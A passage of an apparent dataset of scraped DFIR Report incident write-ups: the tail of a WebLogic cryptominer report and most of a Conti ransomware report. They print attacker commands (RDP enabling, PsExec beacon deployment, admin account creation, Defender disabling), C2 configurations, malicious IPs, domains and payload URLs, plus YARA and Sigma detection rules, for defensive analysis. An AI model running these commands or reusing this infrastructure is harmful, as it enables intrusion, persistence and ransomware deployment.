618a1d0e1e1f6d0a34a5ab6c08acf058ffe46938f53b3357f388df1c7909fc45 Sysvr013.exe 80bc76202b75201c740793ea9cd33b31cc262ef01738b053e335ee5d07a5ba96 [kthreaddi].exe a2f3ecd329d2713855257bf922b8a092cbb1193327ba197351804275286df7dd Network: Exploit Source IP 191[.]252[.]219[.]71 http://194.145.227[.]21/poc.xml http://194.145.227[.]21/pocwin.xml http://194.145.227[.]21/ldr.ps1 Detection Sigma please note that you need to enable webserver logging on the WebLogic server https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2020_14882_weblogic_exploit.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_schtask_creation.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_direct_asep_reg_keys_modification.yml Snort SERVER-WEBAPP Oracle WebLogic Server command injection attempt https://www.snort.org/rule_docs/1-56202 Suricata ET INFO Executable Download from dotted-quad Host AV POLICY HTTP request for .exe file with no User-Agent ET CURRENT_EVENTS Terse alphanumeric executable downloader high likelihood of being hostile ET INFO Packed Executable Download ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download ET INFO SUSPICIOUS Dotted Quad Host MZ Response ET POLICY Cryptocurrency Miner Checkin ETPRO POLICY XMR CoinMiner Usage ETPRO TROJAN CoinMiner Known Malicious Stratum Authline YARA /* YARA Rule Set Author: The DFIR Report Date: 2021-06-03 Identifier: 3580 WebLogic XMRig Miner Reference: https://thedfirreport.com */ /* Rule Set ----------------------------------------------------------------- */ import \"pe\" rule sysrv013 { meta: description = \"files - file sysrv013.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-06-03\" hash1 = \"80bc76202b75201c740793ea9cd33b31cc262ef01738b053e335ee5d07a5ba96\" strings: $s1 = \"eDumped\" fullword ascii $s2 = \"OGhZVFNVRms6\" fullword ascii /* base64 encoded string '8hYTSUFk:' */ $s3 = \"sdumpsebslemW^\" fullword ascii $s4 = \":ERNEL32.DLLODe?\" fullword ascii $s5 = \"pircsek\" fullword ascii $s6 = \"IDE5NC4xNDUu\" fullword ascii /* base64 encoded string ' 194.145.' */ $s7 = \"333444\" ascii /* reversed goodware string '444333' */ $s8 = \"aHx8d2dldCAtLXVzZXItYW\" fullword ascii /* base64 encoded string 'h||wget --user-a' */ $s9 = \"h -c {%\" fullword ascii $s10 = \"?$?)?2?9?{\" fullword ascii /* hex encoded string ')' */ $s11 = \";5A;6D2!D\" fullword ascii /* hex encoded string 'Zm-' */ $s12 = \"3GRAt\\\\5\" fullword ascii $s13 = \"Gorget{\" fullword ascii $s14 = \"7!7&7,727\" fullword ascii /* hex encoded string 'ww'' */ $s15 = \"* {5C;\" fullword ascii $s16 = \"fsftp_fC\" fullword ascii $s17 = \"POSTulL\" fullword ascii $s18 = \"gogetv/\" fullword ascii $s19 = \"\\\\x86+.pdb\" fullword ascii $s20 = \"_DIRCWD?\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 10000KB and ( pe.imphash() == \"406f4cbdf82bde91761650ca44a3831a\" or 8 of them ) } MITRE Exploit Public-Facing Application \u2013 T1190 Command and Scripting Interpreter: PowerShell \u2013 T1059.001 Command and Scripting Interpreter: Windows Command Shell \u2013 T1059.003 Scheduled Task/Job: Scheduled Task \u2013 T1053.005 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder \u2013 T1547.001 Impair Defenses: Disable or Modify System Firewall \u2013 T1562.004 Masquerading: Masquerade Task or Service \u2013 T1036.004 Process Discovery \u2013 T1057 System Network Connections Discovery \u2013 T1049 Ingress Tool Transfer \u2013 T1105 Application Layer Protocol: Web Protocols \u2013 T1071.001 Resource Hijacking \u2013 T1496 Internal case 3580 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Conti Ransomware From Word to Lateral Movement in 1 Hour Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "expected_count": 3
  },
  {
    "url": "https://thedfirreport.com/2021/05/12/conti-ransomware/",
    "title": "Conti Ransomware \u2013 The DFIR Report",
    "content": "Conti Ransomware \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts cobaltstrike conti icedid ransomware Conti Ransomware May 12, 2021 Introduction First seen in May 2020, Conti ransomware has quickly become one of the most common ransomware variants, according to Coveware. As per Coveware\u2019s Quarterly Ransomware Report (Q1 2021), Conti has the 2nd highest market share after Sodinokibi, which we wrote about here . In April, we saw a threat actor go from an initial IcedID infection to deploying Conti ransomware domain wide in two days and 11 hours. The threat actors stayed dormant for most of this time, before jumping into action on an early Saturday morning. The hands on keyboard activity lasted for two and a half hours. They utilized RDP, PsExec, and Cobalt Strike to move laterally within the environment before executing Conti in memory across all active systems. Summary We assess with moderate confidence that the initial vector used by the threat actor was a zip file, which included a malicious JavaScript file, delivered through a phishing campaign. The JavaScript file would eventually download and execute the IcedID malware. Discovered in 2017, what started as a commodity malware is now currently being deployed as an initial access broker by ransomware threat actors. While there was some initial discovery activity from the IcedID malware, it went quiet, just beaconing to command and control but not performing any other activity. After being dormant for over two days, a Cobalt Strike Beacon was dropped and executed on the system infected with IcedID. The threat actors then ran another round of discovery activity with native windows utilities such as nltest.exe, whoami.exe, and net.exe. They then successfully escalated to SYSTEM privileges via Cobalt Strike\u2019s built-in \u201cnamed pipe impersonation\u201d ( GetSystem ) functionality. The threat actors continued by moving laterally to the domain controllers on the network using SMB to transfer and execute a Cobalt Strike Beacon. During that time, we observed port scanning activity from one of the domain controllers, to identify open ports such as SSH, SMB, MSSQL, RDP and WinRM. After a brief gap of 15 minutes, the threat actors used PsExec, to copy and execute a Cobalt Strike Beacon DLL on most of the systems in the network. Later in the attack, the threat actor was seen establishing RDP connections from the beachhead host to the domain controller and other systems throughout the environment. This RDP activity was being proxied through the IcedID process running on that host, to a remote proxy over port 8080. To establish persistence, the attackers created a new local user on one of the domain controllers and added it to the Administrators group. Additionally, in an effort to evade any detection and prevention mechanisms, they disabled Windows Defender via a group policy modification. Within two and a half hours of Cobalt Strike showing up in the environment and just over two days after the initial IcedID infection, the threat actors completed their objective of encrypting all systems. Conti was executed in memory with the help of the Cobalt Strike Beacons domain wide. The ransomware note left by the infection included a link to their Tor site for further details. After further review of the environment (post encryption), we realized multiple systems (including a domain controller) were unable to be accessed and would not have been restorable even if the ransom had been paid. Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here . We also have artifacts available from this case such as pcaps, memory captures, files, Kape packages, and more, under our Security Researcher and Organization services. Timeline Analysis and reporting completed by @pigerlin , @MetallicHack , @yatinwad , and 1 unnamed contributor. Reviewed by @kostastsale , @RoxpinTeddy , and @TheDFIRReport MITRE ATT&CK Initial Access The IcedID DLL that we executed was most likely dropped through a zip file, which included a JavaScript file within it. Brad had a few posts about these around the time of this intrusion. 1 2 Thanks Brad! Various attributes including the computer name and the OS version of the compromised system were sent through encoded cookie values. IcedID was executed via rundll32.exe and ran command and control over port 443 for the duration of the intrusion. rundll32.exe \"C:\\Users\\REDACTED\\AppData\\Local\\Temp\\rate_x32.dat\",update /i:\"LaborBetray\\license.dat\" Discovery IcedID ran initial discovery after being executed on the beachhead. Various commands were executed to gather more information about the compromised environment; including the currently logged on user, domain trusts, groups, etc . ipconfig /all systeminfo whoami /groups net config workstation nltest /domain_trusts nltest /domain_trusts /all_trusts net view /all /domain net view /all new group \"Domain Admins\" /domain Additional discovery commands were executed by Cobalt Strike. cmd.exe /C whoami /groups cmd.exe /C query session cmd.exe /C dir %HOMEDRIVE%%HOMEPATH% cmd.exe /C nltest /domain_trusts cmd.exe /C nltest /dclist: cmd.exe /C net group \"Enterprise admins\" /domain cmd.exe /C net group \"Domain admins\" /domain After moving laterally to a domain controller, they began looking for what networks were present in the environment using dsquery . cmd.exe /C dsquery subnet -limit 0 Shortly thereafter, port scanning was observed coming from a domain controller looking for common ports (such as SSH, SMB, MSSQL, WinRM and RDP, etc.) on systems residing in the same subnet. Privilege Escalation In order to obtain SYSTEM level privileges, Cobalt Strike\u2019s built-in named piped impersonation (GetSystem) was used: Image : \u201cC:\\Windows\\System32\\cmd.exe\u201d CommandLine : \u201cC:\\Windows\\system32\\cmd.exe /c echo 4d64fbbbf34 > \\\\.\\pipe\\b4312c\u201d ParentImage : \u201cC:\\Windows\\System32\\runonce.exe\u201d ParentCommandLine : \u201cC:\\Windows\\system32\\runonce.exe\" Lateral Movement The threat actor began lateral movement using remote execution of Cobalt Strike Beacon service binaries. Image: C:\\Windows\\system32\\services.exe TargetObject: HKLM\\System\\CurrentControlSet\\Services\\d8d6deb\\ImagePath Details: \\\\HOSTNAME\\ADMIN$\\d8d6deb.exe After this initial activity, Cobalt Strike was used to enable RDP, and allow it through the firewall, on the domain controllers. cmd.exe /C reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0x0 /f cmd.exe /C netsh firewall set service type = remotedesktop mode = enable cmd.exe /C netsh firewall set rule group=\"remote desktop\" new enable=Yes cmd.exe /C netsh advfirewall set rule group=\"remote desktop\" new enable=Yes Following this, the threat actors then copied a Cobalt Strike Beacon DLL to the ADMIN$ share; and then, distributed it throughout the environment using PsExec . cmd.exe /C copy 192145.dll \\\\<INTERNAL_IP>\\ADMIN$ /Y /Z psexec.exe -accepteula -d -s \\\\<INTERNAL_IP> rundll32.exe C:\\windows\\192145.dll,StartW From here, RDP connections were established from the beachhead host to systems throughout the environment. The connections were proxied through the IcedID process. The threat actor used a redirector (38.135.122[.]194:8080) to proxy the RDP traffic being passed through the IcedID process. The below traffic shows more details of the RDP session, including the username in the cookie. This proxied traffic reported back the hostname of the threat actors machine as \u201cmikespc\u201d. We\u2019re looking for you Mike! \ud83d\ude09 Defense Evasion To evade detection, the threat actors disabled Windows Defender by adding the below to an already linked GPO. They then force updated the GPO on all clients using Cobalt Strike. ParentCommandLine CommandLine C:\\Windows\\System32\\dllhost.exe C:\\Windows\\system32\\cmd.exe /C gpupdate /force C:\\Users\\USER\\AppData\\Local\\Temp\\icju1.exe C:\\Windows\\system32\\cmd.exe /C gpupdate /force C:\\Windows\\System32\\dllhost.exe C:\\Windows\\system32\\cmd.exe /C gpupdate /force \u201crundll32.exe\u201d c:\\windows\\192145.dll,StartW C:\\Windows\\system32\\cmd.exe /C gpupdate /force Registry Keys Action HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware DeleteValue HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Monitoring\\DisableRealtimeMonitoring DeleteValue HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Monitoring\\DisableBehaviorMonitoring DeleteValue HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Monitoring\\DisableIntrusionPreventionSystem DeleteValue HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection DeleteKey In addition, other security services were stopped or uninstalled. NET STOP \"redacted\" EventID : 13 Description : RegistryEvent (Value Set) TargetObject : HKLM\\System\\CurrentControlSet\\Services\\<redacted>\\Start Value : DWORD (0x00000004) Command and Control IcedID 68.183.20[.]194:80 vaclicinni[.]xyz 83.97.20[.]160:443 oxythuler[.]cyou expertulthima[.]club dictorecovery[.]cyou thulleultinn[.]club Key identifier: 82:92:07:FD:86:23:FE:26:0E:4A:42:5A:F7:C7:70:2A:45:4E:01:5B Not Before: Apr 22 15:27:02 2021 GMT Not After : Apr 22 15:27:02 2022 GMT CommonName: localhost City= AU State= Some-State Org = Internet Widgits Pty Ltd ja3: a0e9f5d64349fb13191bc781f81f42e1 ja3s: ec74a5c51106f0419184d0dd08fb05bc 159.89.140[.]116:443 oxythuler[.]cyou thulleultinn[.]club Key Identifier: A4:EB:95:C2:04:91:E3:AF:67:7C:5D:B3:CB:DB:E3:38:90:5E:A7:68 Not Before: Apr 13 14:59:41 2021 GMT Not After : Apr 13 14:59:41 2022 GMT CommonName: localhost City= AU State= Some-State Org = Internet Widgits Pty Ltd ja3: a0e9f5d64349fb13191bc781f81f42e1 ja3s: ec74a5c51106f0419184d0dd08fb05bc Cobalt Strike 192.99.178[.]145:80 dimentos[.]com Config: Port 443: \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce[.]exe\", \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce[.]exe\", \"Jitter\": 39, \"Method 2\": \"POST\", \"Port\": 443, \"Beacon Type\": \"8 (HTTPS)\", \"Polling\": 62719, \"HTTP Method Path 2\": \"/btn_bg\", \"Method 1\": \"GET\", \"C2 Server\": \"dimentos[.]com,/FAQ\" \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce[.]exe\", \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce[.]exe\", \"Jitter\": 39, \"Method 2\": \"POST\", \"Port\": 443, \"Beacon Type\": \"8 (HTTPS)\", \"Polling\": 62719, \"HTTP Method Path 2\": \"/btn_bg\", \"Method 1\": \"GET\", \"C2 Server\": \"dimentos[.]com,/bg\" Port 80: \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce[.]exe\", \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce[.]exe\", \"Jitter\": 39, \"Method 2\": \"POST\", \"Port\": 80, \"Beacon Type\": \"0 (HTTP)\", \"Polling\": 62719, \"HTTP Method Path 2\": \"/btn_bg\", \"Method 1\": \"GET\", \"C2 Server\": \"192[.]99[.]178[.]145,/r-arrow\" \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce[.]exe\", \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce[.]exe\", \"Jitter\": 39, \"Method 2\": \"POST\", \"Port\": 80, \"Beacon Type\": \"0 (HTTP)\", \"Polling\": 62719, \"HTTP Method Path 2\": \"/btn_bg\", \"Method 1\": \"GET\", \"C2 Server\": \"192[.]99[.]178[.]145,/bg\" Machine beaconing out to Cobalt Strike using the above profile Persistence An account named \u201cnuuser\u201d was created by one of the Cobalt Strike Beacons. As these commands were run on a domain controller, it essentially added the account to the Built-in Administrators domain group, granting it administrative privileges in the AD domain. net user /add /Y nuuser 7HeC00l3stP@ssw0rd net localgroup administrators nuuser /add Credential Access LSASS was accessed by an unusual process \u201crunonce.exe\u201d on multiple hosts, including a domain controller. EventID : 10 Description : Process Access SourceImage : \u201cC:\\Windows\\System32\\runonce.exe\u201d TargetImage : \u201cC:\\Windows\\system32\\lsass.exe\u201d SourceImage: C:\\Windows\\system32\\runonce.exe\" TargetImage: \"C:\\Windows\\system32\\lsass.exe\" GrantedAccess: 0x1010 CallTrace: \"C:\\Windows\\SYSTEM32\\ntdll.dll+9c584|C:\\Windows\\System32\\KERNELBASE.dll+2730e|UNKNOWN(0000028A62BDC798)\" The overpass-the hash technique was used to acquire a valid Kerberos ticket for the administrator user. Impact About two and a half hours after initial hands on keyboard activity, the Cobalt Strike Beacon processes running across the target systems injected the Conti DLL into memory. Conti deployments using a DLL seem to have first started showing up in December 2020. First time that I see #Conti ransomware spread as a DLL : Hash : 5c278c04bb19196dc8559d45b9728b3ba0c1bc5cdd20a766f56248e561c6f5a6 Pdb : A:sourceconti_v3x64Releasecryptor_dll.pdb (cc @GrujaRS @malwrhunterteam ) pic.twitter.com/gH3uCpVMpB \u2014 The Brofessor (@Glacius_) December 8, 2020 Some traces of this particular DLL were found in the memory dump taken from one of the compromised systems. We were unable to reconstruct the DLL from memory but Maxime Thiebaut (@0xThiebaut) from NVISO helped us out. The Yara rule, located in the detections section below was made possible due to him reconstructing the DLL. Thanks Maxime! Conti scans the network for 445/SMB, looking for machines to encrypt. Ransom note Which leads you here. The threat actors asked for 150k and could have been talked down at least ~20%. Multiple machines within the environment were not usable after being ransomed including a domain controller. The machines were left like this and you were not able to do anything but press control+alt+delete. Paying the ransom will not help you here. Pivots While researching the infrastructure related to this campaign, we found the threat actor revealed further infrastructure. The domain associated with the Cobalt Strike C2 (dimentos[.]com) has an unredacted Whois record that reveals several other domains also registered by the address pokix19891[@]kindbest[.]com. You\u2019ll notice the fake address and fake phone number as well. All the domains were registered on 2021-03-30, and according to public data available in VirusTotal, three of them have been associated with Cobalt Strike infrastructure so far; the domain seen in this intrusion, powelin[.]com and awesents[.]com. The two other domains (jocinet[.]com, ilimennt[.]com) have subdomains that look like name servers (ns1 and ns2), which were pointed to two of the Cobalt Strike hosting IP\u2019s. All of this infrastructure was hosted on the VPS provider OVH. IOCs Files b52c0640957e5032b5160578f8cb99f9b066fde4f9431ee6869b2eea67338f28.dll.exe b52c0640957e5032b5160578f8cb99f9b066fde4f9431ee6869b2eea67338f28 icju1.exe e54f38d06a4f11e1b92bb7454e70c949d3e1a4db83894db1ab76e9d64146ee06 rate_x32.dat eb79168391e64160883b1b3839ed4045b4fd40da14d6eec5a93cfa9365503586 192145.dll f29bc338e63a62c24c301c04961084013816733dad446a29c20d4413c5c818af9 Network IcedID vaclicinni[.]xyz thulleultinn[.]club oxythuler[.]cyou dictorecovery[.]cyou expertulthima[.]club 68.183.20[.]194:80 159.89.140[.]116:443 83.97.20[.]160:443 Cobalt Strike dimentos[.]com 192.99.178[.]145:80 Proxy 38.135.122[.]194:8080 Detections Suricata ET MALWARE Win32/IcedID Requesting Encoded Binary M4 ET MALWARE W32/ Photoloader.Downloader Request Cookie ET POLICY PE EXE or DLL Windows file download HTTP ET INFO Executable Retrieved With Minimal HTTP Headers \u2013 Potential Second Stage Download ET INFO Packed Executable Download ET POLICY OpenSSL Demo CA \u2013 Internet Widgits Pty ATTACK [ PTsecurity ] Overpass the hash. Encryption downgrade activity to ARCFOUR-HMAC-MD5 ET SCAN Behavioral Unusual Port 135 traffic Potential Scan or Infection ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET SCAN Behavioral Unusual Port 1434 traffic Potential Scan or Infection ET SCAN Behavioral Unusual Port 1435 traffic Potential Scan or Infection Sigma https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_meterpreter_or_cobaltstrike_getsystem_service_installation.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_commands_recon_activity.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/other/win_defender_disabled.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/other/win_tool_psexec.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_access/sysmon_in_memory_assembly_execution.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/sysmon_rundll32_net_connections.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_net_user_add.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_psexesvc_start.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_psexec_eula.yml Sigma Rule Converter for SIEMs and EDRs: https://uncoder.io/ YARA /* YARA Rule Set Author: The DFIR Report Date: 2021-05-09 Identifier: 3584 Reference: https://thedfirreport.com */ /* Rule Set ----------------------------------------------------------------- */ import \"pe\" rule icedid_rate_x32 { meta: description = \"files - file rate_x32.dat\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-05-09\" hash1 = \"eb79168391e64160883b1b3839ed4045b4fd40da14d6eec5a93cfa9365503586\" strings: $s1 = \"UAWAVAUATVWSH\" fullword ascii $s2 = \"UAWAVVWSPH\" fullword ascii $s3 = \"AWAVAUATVWUSH\" fullword ascii $s4 = \"update\" fullword ascii /* Goodware String - occured 207 times */ $s5 = \"?klopW@@YAHXZ\" fullword ascii $s6 = \"?jutre@@YAHXZ\" fullword ascii $s7 = \"PluginInit\" fullword ascii $s8 = \"[]_^A\\\\A]A^A_\" fullword ascii $s9 = \"e8[_^A\\\\A]A^A_]\" fullword ascii $s10 = \"[_^A\\\\A]A^A_]\" fullword ascii $s11 = \"Kts=R,4iu\" fullword ascii $s12 = \"mqr55c\" fullword ascii $s13 = \"R,4i=Bj\" fullword ascii $s14 = \"Ktw=R,4iu\" fullword ascii $s15 = \"Ktu=R,4iu\" fullword ascii $s16 = \"Kt{=R,4iu\" fullword ascii $s17 = \"KVL.Mp\" fullword ascii $s18 = \"Kt|=R,4iu\" fullword ascii $s19 = \"=8c[Vt8=\" fullword ascii $s20 = \"Ktx=R,4iu\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 700KB and ( pe.imphash() == \"15787e97e92f1f138de37f6f972eb43c\" and ( pe.exports(\"?jutre@@YAHXZ\") and pe.exports(\"?klopW@@YAHXZ\") and pe.exports(\"PluginInit\") and pe.exports(\"update\") ) or 8 of them ) } rule conti_cobaltstrike_192145 { meta: description = \"files - file 192145.dll\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-05-09\" hash1 = \"29bc338e63a62c24c301c04961084013816733dad446a29c20d4413c5c818af9\" strings: $x1 = \"cmd.exe /c echo NGAtoDgLpvgJwPLEPFdj>\\\"%s\\\"&exit\" fullword ascii $s2 = \"veniamatquiest90.dll\" fullword ascii $s3 = \"Quaerat magni assumenda nihil architecto labore ullam autem unde temporibus mollitia illum\" fullword ascii $s4 = \"Quaerat tempora culpa provident\" fullword ascii $s5 = \"Velit consequuntur quisquam tempora error\" fullword ascii $s6 = \"Quo omnis repellat ut expedita temporibus eius fuga error\" fullword ascii $s7 = \"Dolores ullam tempora error distinctio ut natus facere quibusdam\" fullword ascii $s8 = \"Corporis minima omnis qui est temporibus sint quo error magnam\" fullword ascii $s9 = \"Officia sit maiores deserunt nobis tempora deleniti aut et quidem fugit\" fullword ascii $s10 = \"Rerum tenetur sapiente est tempora qui deserunt\" fullword ascii $s11 = \"Sed nulla quaerat porro error excepturi\" fullword ascii $s12 = \"Aut tempore quo cumque dicta ut quia in\" fullword ascii $s13 = \"Doloribus commodi repudiandae voluptates consequuntur neque tempora ut neque nemo ad ut\" fullword ascii $s14 = \"Tempore possimus aperiam nam mollitia illum hic at ut doloremque\" fullword ascii $s15 = \"Dolorum eum ipsum tempora non et\" fullword ascii $s16 = \"Quas alias illum laborum tempora sit est rerum temporibus dicta et\" fullword ascii $s17 = \"Et quia aut temporibus enim repellat dolores totam recusandae repudiandae\" fullword ascii $s18 = \"Sed velit ipsa et dolor tempore sunt nostrum\" fullword ascii $s19 = \"Veniam voluptatem aliquam et eaque tempore tenetur possimus\" fullword ascii $s20 = \"Possimus suscipit placeat dolor quia tempora voluptas qui fugiat et accusantium\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 2000KB and ( pe.imphash() == \"5cf3cdfe8585c01d2673249153057181\" and pe.exports(\"StartW\") or ( 1 of ($x*) or 4 of them ) ) } rule conti_cobaltstrike_icju1 { meta: description = \"files - file icju1.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-05-09\" hash1 = \"e54f38d06a4f11e1b92bb7454e70c949d3e1a4db83894db1ab76e9d64146ee06\" strings: $x1 = \"cmd.exe /c echo NGAtoDgLpvgJwPLEPFdj>\\\"%s\\\"&exit\" fullword ascii $s2 = \"veniamatquiest90.dll\" fullword ascii $s3 = \"Quaerat magni assumenda nihil architecto labore ullam autem unde temporibus mollitia illum\" fullword ascii $s4 = \"Quaerat tempora culpa provident\" fullword ascii $s5 = \"Velit consequuntur quisquam tempora error\" fullword ascii $s6 = \"Quo omnis repellat ut expedita temporibus eius fuga error\" fullword ascii $s7 = \"Dolores ullam tempora error distinctio ut natus facere quibusdam\" fullword ascii $s8 = \"Corporis minima omnis qui est temporibus sint quo error magnam\" fullword ascii $s9 = \"Officia sit maiores deserunt nobis tempora deleniti aut et quidem fugit\" fullword ascii $s10 = \"Rerum tenetur sapiente est tempora qui deserunt\" fullword ascii $s11 = \"Sed nulla quaerat porro error excepturi\" fullword ascii $s12 = \"Aut tempore quo cumque dicta ut quia in\" fullword ascii $s13 = \"Doloribus commodi repudiandae voluptates consequuntur neque tempora ut neque nemo ad ut\" fullword ascii $s14 = \"Tempore possimus aperiam nam mollitia illum hic at ut doloremque\" fullword ascii $s15 = \"Dolorum eum ipsum tempora non et\" fullword ascii $s16 = \"Quas alias illum laborum tempora sit est rerum temporibus dicta et\" fullword ascii $s17 = \"Et quia aut temporibus enim repellat dolores totam recusandae repudiandae\" fullword ascii $s18 = \"Sed velit ipsa et dolor tempore sunt nostrum\" fullword ascii $s19 = \"Veniam voluptatem aliquam et eaque tempore tenetur possimus\" fullword ascii $s20 = \"Possimus suscipit placeat dolor quia tempora voluptas qui fugiat et accusantium\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 2000KB and ( pe.imphash() == \"a6d9b7f182ef1cfe180f692d89ecc759\" or ( 1 of ($x*) or 4 of them ) ) } rule conti_v3 { meta: description = \"conti_yara - file conti_v3.dll\" author = \"pigerlin\" reference = \"https://thedfirreport.com\" date = \"2021-05-09\" hash1 = \"8391dc3e087a5cecba74a638d50b771915831340ae3e027f0bb8217ad7ba4682\" strings: $s1 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii $s2 = \"conti_v3.dll\" fullword ascii $s3 = \" <requestedExecutionLevel level='asInvoker' uiAccess='false' />\" fullword ascii $s4 = \" Type Descriptor'\" fullword ascii $s5 = \"operator co_await\" fullword ascii $s6 = \" <trustInfo xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\">\" fullword ascii $s7 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide $s8 = \" Base Class Descriptor at (\" fullword ascii $s9 = \" Class Hierarchy Descriptor'\" fullword ascii $s10 = \" Complete Object Locator'\" fullword ascii $s11 = \" delete[]\" fullword ascii $s12 = \" </trustInfo>\" fullword ascii $s13 = \"__swift_1\" fullword ascii $s15 = \"__swift_2\" fullword ascii $s19 = \" delete\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 700KB and all of them } rule conti_cobaltstrike_192145_icju1_0 { meta: description = \"files - from files 192145.dll, icju1.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-05-09\" hash1 = \"29bc338e63a62c24c301c04961084013816733dad446a29c20d4413c5c818af9\" hash2 = \"e54f38d06a4f11e1b92bb7454e70c949d3e1a4db83894db1ab76e9d64146ee06\" strings: $x1 = \"cmd.exe /c echo NGAtoDgLpvgJwPLEPFdj>\\\"%s\\\"&exit\" fullword ascii $s2 = \"veniamatquiest90.dll\" fullword ascii $s3 = \"Quaerat magni assumenda nihil architecto labore ullam autem unde temporibus mollitia illum\" fullword ascii $s4 = \"Quaerat tempora culpa provident\" fullword ascii $s5 = \"Dolores ullam tempora error distinctio ut natus facere quibusdam\" fullword ascii $s6 = \"Velit consequuntur quisquam tempora error\" fullword ascii $s7 = \"Corporis minima omnis qui est temporibus sint quo error magnam\" fullword ascii $s8 = \"Quo omnis repellat ut expedita temporibus eius fuga error\" fullword ascii $s9 = \"Officia sit maiores deserunt nobis tempora deleniti aut et quidem fugit\" fullword ascii $s10 = \"Rerum tenetur sapiente est tempora qui deserunt\" fullword ascii $s11 = \"Sed nulla quaerat porro error excepturi\" fullword ascii $s12 = \"Aut tempore quo cumque dicta ut quia in\" fullword ascii $s13 = \"Doloribus commodi repudiandae voluptates consequuntur neque tempora ut neque nemo ad ut\" fullword ascii $s14 = \"Tempore possimus aperiam nam mollitia illum hic at ut doloremque\" fullword ascii $s15 = \"Et quia aut temporibus enim repellat dolores totam recusandae repudiandae\" fullword ascii $s16 = \"Dolorum eum ipsum tempora non et\" fullword ascii $s17 = \"Quas alias illum laborum tempora sit est rerum temporibus dicta et\" fullword ascii $s18 = \"Sed velit ipsa et dolor tempore sunt nostrum\" fullword ascii $s19 = \"Veniam voluptatem aliquam et eaque tempore tenetur possimus\" fullword ascii $s20 = \"Possimus suscipit placeat dolor quia tempora voluptas qui fugiat et accusantium\" fullword ascii condition: ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them ) } MITRE: Command and Scripting Interpreter \u2013 T1059 External Proxy \u2013 T1090.002 Remote Desktop Protocol \u2013 T1021.001 OS Credential Dumping \u2013 T1003 Pass the Hash \u2013 T1550.002 Service Execution \u2013 T1569.002 SMB/Windows Admin Shares \u2013 T1021.002 Data Encrypted for Impact \u2013 T1486 System Owner/User Discovery \u2013 T1033 Permission Groups Discovery \u2013 T1069 Application Layer Protocol \u2013 T1071 Process Injection \u2013 T1055 Group Policy Modification \u2013 T1484 Access Token Manipulation \u2013 T1134 Create Account \u2013 T1136 Remote System Discovery \u2013 T1018 Network Service Scanning \u2013 T1046 Domain Account \u2013 T1087.002 Impair Defenses \u2013 T1562 Internal case: 3584 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new 